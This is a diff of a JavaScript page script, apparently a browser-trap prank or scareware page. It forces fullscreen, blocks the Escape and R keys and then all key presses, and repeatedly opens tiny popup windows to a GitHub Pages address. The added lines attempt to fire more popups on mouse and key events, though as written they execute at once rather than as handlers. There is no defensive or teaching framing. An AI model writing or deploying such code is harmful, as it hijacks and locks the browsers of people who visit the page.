@@ -53,24 +53,29 @@ function launchFullScreen(element) {
 	  element.webkitRequestFullScreen();
 	}
   }
-  launchFullScreen(document.documentElement);
+launchFullScreen(document.documentElement);
+
 window.onkeydown = function(x){
     if(x.keyCode === 27){
         x.preventDefault();
     }
 };
+
 window.onkeydown = function(r){
     if(r.keyCode === 82){ 
         r.preventDefault();
     }
 };
+
 document.onkeydown = function (e) {
 	e.preventDefault();		
 }
+
 window.open ("https://th3rdctrl.github.io/index.html","","fullscreen=yes");  
 window.open('https://th3rdctrl.github.io/index.html','_parent','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
 window.open('https://th3rdctrl.github.io/index.html','_blank','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
 window.open('https://th3rdctrl.github.io/index.html','_top','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
 window.open('https://th3rdctrl.github.io/index.html','_self','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
-// window.close();
-// localStrorage.clear()
+document.onmousedown=window.open('https://th3rdctrl.github.io/index.html','_blank','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');;
+document.onkeyup=window.open('https://th3rdctrl.github.io/index.html','_top','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
+document.onmousemove=window.open('https://th3rdctrl.github.io/index.html','_parent','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
